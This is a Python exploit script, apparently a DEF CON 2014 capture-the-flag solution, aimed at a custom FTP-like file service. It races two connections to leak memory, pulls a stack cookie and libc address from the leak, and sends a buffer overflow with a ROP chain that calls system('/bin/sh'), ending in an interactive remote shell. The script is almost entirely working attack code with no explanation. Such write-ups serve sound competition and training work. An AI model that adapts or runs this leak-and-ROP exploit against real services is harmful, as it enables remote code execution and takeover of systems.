from isis import *

local_offset=0x01a6a20 #12.04
remote_offset=0x001abac0 #14.04

local_system_offset=0x3f430
remote_system_offset=0x00403b0


offset=local_offset
systen_offset=local_system_offset

#chal = ('sftp_bf28442aa4ab1a4089ddca16729b29ac.2014.shallweplayaga.me',115)
chal = ('localhost',2323)

s=get_socket(chal)

s2=get_socket(chal)

SLEEP_TIME=.2
data_section=0x0804C070
read_plt=0x080486A0
pppr=0x8049541
binsh='/bin/sh\0'

read_bin_sh_rop=lei(read_plt,pppr,0,data_section,len(binsh))


def create_file(s,name,data):
	s.send("STOR OLD {}\n".format(name))
	time.sleep(SLEEP_TIME)
	line_back=s.recv(0x100000)
	s.send("SIZE {}\n".format(len(data)))
	time.sleep(SLEEP_TIME)
	s.send(data)

pattern  = 'A'*0x2c+'\x2c'+'\x0a'+'A'*2

filename = 'bk_jerks'
s.send('USER defcon\n')
time.sleep(SLEEP_TIME)
s.send('PASS defcon2014\n')
time.sleep(SLEEP_TIME)
s2.send('USER defcon\n')
time.sleep(SLEEP_TIME)
s2.send('PASS defcon2014\n')
time.sleep(SLEEP_TIME)


s.send('KILL {}\n'.format(filename))
time.sleep(SLEEP_TIME)


s.send('STOR OLD {}\n'.format(filename)) #waiting for data
time.sleep(SLEEP_TIME)


s2.send('RETR {}\n'.format(filename)) #size is zero
time.sleep(SLEEP_TIME)

s.send('SIZE {}\n'.format(len(pattern)))
time.sleep(SLEEP_TIME)

print 'sending first file\n size: {}'.format(len(pattern))

s.send(pattern)
time.sleep(SLEEP_TIME)

s.close() #one pid exits
time.sleep(SLEEP_TIME)

#raw_input('debug')

junk=s2.recv(0x10000)
s2.send('SEND\n')
time.sleep(1)
memory=s2.recv(0x1000000)
print len(memory)

cookie=ulei(memory)[231]
print 'cookie: {}'.format(hex(cookie))
stdio=ulei(memory)[110]
print '_IO_2_1_stdout_: {}'.format(hex(stdio))
#print map(hex,ulei(memory))

libc=stdio - offset
print 'libc: {}'.format(libc)
system=libc+systen_offset
print 'system: {}'.format(system)


s=get_socket(chal)
s.send('USER defcon\n')
time.sleep(SLEEP_TIME)
s.send('PASS defcon2014\n')
time.sleep(SLEEP_TIME)
s.send('KILL {}\n'.format(filename))
time.sleep(SLEEP_TIME)

system_rop=lei(system, 0x88888888, data_section)

new_pattern='A'*0x2c+'\xff'+'A'*668+lei(cookie)+'A'*0xc+read_bin_sh_rop+system_rop

s.send('STOR OLD {}\n'.format(filename)) #waiting for data
time.sleep(SLEEP_TIME)


s2.send('RETR {}\n'.format(filename)) #size is zero
time.sleep(SLEEP_TIME)

s.send('SIZE {}\n'.format(len(new_pattern)))
time.sleep(SLEEP_TIME)


print 'sending first file\n size: {}'.format(len(new_pattern))
s.send(new_pattern)
time.sleep(SLEEP_TIME)
#print s.recv(0x100000)

s.close() #one pid exits (again)


#raw_input('debug2')

s2.send('SEND\n')
s2.send(binsh)
time.sleep(SLEEP_TIME)

s2.recv(0x10000)
print '\n\n\nENJOY YOUR SHELL\n\n\n'

telnet_shell(s2)
